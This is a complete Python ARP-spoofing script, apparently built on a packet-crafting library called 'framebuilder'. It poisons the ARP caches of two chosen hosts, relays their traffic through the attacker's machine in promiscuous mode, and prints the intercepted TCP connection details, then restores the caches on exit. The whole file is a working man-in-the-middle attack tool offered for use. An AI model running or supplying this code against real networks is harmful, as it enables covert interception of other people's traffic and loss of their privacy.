#!/usr/bin/env python3

'''Script for ARP spoofing'''

import time, os, sys
from framebuilder import eth, ipv4, tcp, tools, errors


def print_err(msg):
    arg_str = 'interface left_ip right_ip'
    print('Error:', msg)
    print(f'Usage: {sys.argv[0]} {arg_str}')


def check_args():
    if len(sys.argv) < 4:
        print_err('Missing arguments')
        sys.exit(1)
    if not tools.is_valid_ipv4_address(sys.argv[2]):
        print_err(f'Invalid IP address: {sys.argv[2]}')
        sys.exit(1)
    if not tools.is_valid_ipv4_address(sys.argv[3]):
        print_err(f'Invalid IP address: {sys.argv[4]}')
        sys.exit(1)


def get_mac_addr(ip_addr, if_name):
    mac_addr = None
    if_mac = tools.get_mac_addr(if_name)
    if_ip = tools.get_if_ipv4_addr(if_name)
    gw = tools.get_route_gateway(ip_addr)
    if gw is not None:
        ip_addr = gw
    arp_sock = tools.create_socket(if_name)
    max_try = 5
    for num_try in range(max_try):
        try:
            mac_addr = tools.get_mac_for_dst_ip(ip_addr)
            if mac_addr is None:
                raise errors.FailedMACQueryException(f'IP {ip_addr}')
            return mac_addr
        except errors.FailedMACQueryException as e:
            # set an invalid ARP cache entry and try to update it
            tools.set_neigh(if_name, ip_addr)
            if num_try < max_try - 1:
                arp_data = {
                        'operation': 1,
                        'src_addr': if_mac,
                        'dst_addr': 'ff:ff:ff:ff:ff:ff',
                        'snd_hw_addr': if_mac,
                        'snd_ip_addr': if_ip,
                        'tgt_hw_addr': '00:00:00:00:00:00',
                        'tgt_ip_addr': ip_addr
                        }
                arp_msg = eth.ArpMessage(arp_data)
                arp_msg.send(arp_sock)
                time.sleep(0.2)
            else:
                print(str(e))
                arp_sock.close()
                sys.exit(1) 


check_args()
if_name = sys.argv[1]
os.system(f'sysctl -w net.ipv4.conf.{if_name}.forwarding=0')

my_ip = tools.get_if_ipv4_addr(if_name)
if my_ip is None:
    print_err(f'Could not find IP address of interface {sys.argv[1]}')
my_mac = tools.get_mac_addr(if_name)

interval = 10**9
left_ip = sys.argv[2]
left_mac = get_mac_addr(left_ip, if_name)
right_ip = sys.argv[3]
right_mac = get_mac_addr(right_ip, if_name)

tools.print_rgb('--- ARP spoofer ---',
        rgb=(200, 200, 200), bold=True)
tools.print_rgb(f'{left_ip} @ {left_mac} --> {my_mac}',
        rgb=(200, 0, 0), bold=True)
tools.print_rgb(f'{right_ip} @ {right_mac} --> {my_mac}',
        rgb=(200, 0, 0), bold=True)

arp_data_left = {'operation': 2,
        'src_addr': my_mac,
        'dst_addr': left_mac,
        'snd_hw_addr': my_mac,
        'snd_ip_addr': right_ip,
        'tgt_hw_addr': my_mac,
        'tgt_ip_addr': right_ip}

arp_msg_left = eth.ArpMessage(arp_data_left)

arp_data_right = {'operation': 2,
        'src_addr': my_mac,
        'dst_addr': right_mac,
        'snd_hw_addr': my_mac,
        'snd_ip_addr': left_ip,
        'tgt_hw_addr': my_mac,
        'tgt_ip_addr': left_ip}

arp_msg_right = eth.ArpMessage(arp_data_right)

eth_handler = eth.EthernetHandler(if_name, local_mac=my_mac, remote_mac=left_mac, block=0)
# current time
ctime = 0

try:
    while True:
        if time.time_ns() >= ctime + interval or ctime == 0:
            arp_msg_right.send(eth_handler.socket)
            arp_msg_left.send(eth_handler.socket)
            ctime = time.time_ns()
        frame, frame_type = eth_handler.receive(promisc=True)
        
        # don't process frames that we have sent ourselves (frame_type 4)
        if frame is not None and frame_type != 4:
            ip_pk = ipv4.IPv4Packet.from_frame(frame)
            conditions  = [ip_pk.src_addr == left_ip,
                    ip_pk.dst_addr == left_ip,
                    ip_pk.src_addr == right_ip,
                    ip_pk.dst_addr == right_ip]
            if any(conditions):
                # forward frames to their real destination
                if frame.src_addr == right_mac and ip_pk.dst_addr != my_ip:
                    eth_handler.remote_mac = left_mac
                    eth_handler.send(ip_pk)
                if frame.src_addr == left_mac and ip_pk.dst_addr != my_ip:
                    eth_handler.remote_mac = right_mac
                    eth_handler.send(ip_pk)
                # capture and print TCP connection data
                if ip_pk.protocol == 6:
                    tcp_seg = tcp.TCPSegment.from_packet(ip_pk)
                    a_str = f'{ip_pk.src_addr}:{tcp_seg.src_port} -> {ip_pk.dst_addr}:{tcp_seg.dst_port}'
                    seqacklen = f'SEQ:{tcp_seg.seq_nr} ACK:{tcp_seg.ack_nr} LEN:{tcp_seg.length}'
                    flags = tcp_seg.get_flag_str()
                    color = (100, 200, 100)
                    tools.print_rgb(f'{a_str}\t',
                            rgb=color, bold=True, end='')
                    color = (150, 150, 150)
                    tools.print_rgb(seqacklen,
                            rgb=color, bold=True, end='')
                    color = (200, 150, 100)
                    tools.print_rgb(f'\t{flags}',
                            rgb=color, bold=False)
except KeyboardInterrupt: 
    tools.print_rgb('Ctrl-C -- Handing connections over...',
            rgb=(200, 0, 0), bold=True, end='')
    arp_data_left = {'operation': 2,
            'src_addr': my_mac,
            'dst_addr': left_mac,
            'snd_hw_addr': right_mac,
            'snd_ip_addr': right_ip,
            'tgt_hw_addr': right_mac,
            'tgt_ip_addr': right_ip}

    arp_msg_left = eth.ArpMessage(arp_data_left)

    arp_data_right = {'operation': 2,
            'src_addr': my_mac,
            'dst_addr': right_mac,
            'snd_hw_addr': left_mac,
            'snd_ip_addr': left_ip,
            'tgt_hw_addr': left_mac,
            'tgt_ip_addr': left_ip}

    arp_msg_right = eth.ArpMessage(arp_data_right)
    for i in range(3): 
        arp_msg_right.send(eth_handler.socket)
        arp_msg_left.send(eth_handler.socket)
        time.sleep(0.1)
    tools.print_rgb('Done. Bye!',
            rgb=(200, 0, 0), bold=True)
